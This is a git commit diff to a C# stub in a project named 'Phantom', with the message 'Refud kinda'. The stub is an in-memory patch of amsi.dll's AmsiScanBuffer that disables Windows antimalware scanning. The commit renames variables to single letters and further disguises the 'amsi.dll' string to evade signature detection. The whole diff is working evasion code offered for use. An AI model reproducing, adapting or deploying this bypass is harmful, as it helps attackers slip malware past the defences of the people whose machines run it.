81d22dd320c4209fcc271e5533c9345d4467320b
Knakiri <95192545+Knakiri@users.noreply.github.com>
2024-07-01 02:47:54 +0200

    Update BStub.cs
    Refud kinda ;0

--- Phantom/Resources/BStub.cs
+++ Phantom/Resources/BStub.cs
@@ -9,47 +9,42 @@ namespace PHANTOM
     internal class Program
     {
         [DllImport("kernel32.dll")]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
 
         [DllImport("kernel32.dll")]
-        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        public static extern bool VirtualProtect(IntPtr lpF, UIntPtr dwSize, uint flNewProtect, out uint lpflH);
 
-        private static IntPtr ASLR(IntPtr Relative_Address, IntPtr Relative_BaseAddress, string ModuleName)
+        public static IntPtr ASLR(IntPtr Relative_F, IntPtr Relative_BaseF, string ModuleName)
         {
-            return (IntPtr)((long)Relative_Address - (long)Relative_BaseAddress + (long)GetModuleHandle(ModuleName));
+            return (IntPtr)((long)Relative_F - (long)Relative_BaseF + (long)GetModuleHandle(ModuleName));
         }
 
 #if x64
-        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x180008260; //May change in the future!
-        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x180003860; //May change in the future!
-        private static IntPtr RebaseAddress = (IntPtr)0x180000000;
+        private static IntPtr L = (IntPtr)0x180008260; //May change in the future!
+        private static IntPtr M = (IntPtr)0x180003860; //May change in the future!
+        private static IntPtr N = (IntPtr)0x180000000;
 #else
-        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x10005D60; //May change in the future!
-        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x10005960; //May change in the future!
-        private static IntPtr RebaseAddress = (IntPtr)0x10000000;
+        private static IntPtr L = (IntPtr)0x10005D60; //May change in the future!
+        private static IntPtr M = (IntPtr)0x10005960; //May change in the future!
+        private static IntPtr N = (IntPtr)0x10000000;
 #endif
 
-        private static uint PAGE_EXECUTE_READWRITE = 0x40;
+        private static uint O = 0x40;
 
-        private static string obfDll_Str = @"*a*m*s*i*.*d*l*l*".Replace(@"*", @"");
+        private static string P = new String(new char[] { '*', 'a', '*', 'm', '*', 's', '*', 'i', '*', '.', '*', 'd', '*', 'l', '*', 'l', '*' })
+                                  .Replace(new string(new char[] { '*', 'a', '*', 'm', '*', 's', '*', 'i', '*', '.', '*', 'd', '*', 'l', '*', 'l', '*' }).Substring(0, 1), string.Empty);
 
         [STAThread]
         static void Main()
         {
-            IntPtr Address = IntPtr.Zero;
-            if (new ComputerInfo().OSFullName.Contains(@"11") == true)
-            {
-                Address = ASLR(amsiScanBufferAddress_Win11, RebaseAddress, obfDll_Str);
-            }
-            else
-            {
-                Address = ASLR(amsiScanBufferAddress_Win10, RebaseAddress, obfDll_Str);
-            }
-            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-            uint oldProtect;
-            VirtualProtect(Address, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
-            Marshal.Copy(Patch, 0, Address, Patch.Length);
-            VirtualProtect(Address, (UIntPtr)Patch.Length, oldProtect, out oldProtect);
+            IntPtr Q = IntPtr.Zero;
+            string osName = new ComputerInfo().OSFullName;
+            Q = osName.Contains(@"11") ? ASLR(L, N, P) : ASLR(M, N, P);
+            byte[] R = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+            uint S;
+            VirtualProtect(Q, (UIntPtr)R.Length, O, out S);
+            Marshal.Copy(R, 0, Q, R.Length);
+            VirtualProtect(Q, (UIntPtr)R.Length, S, out S);
         }
     }
 }
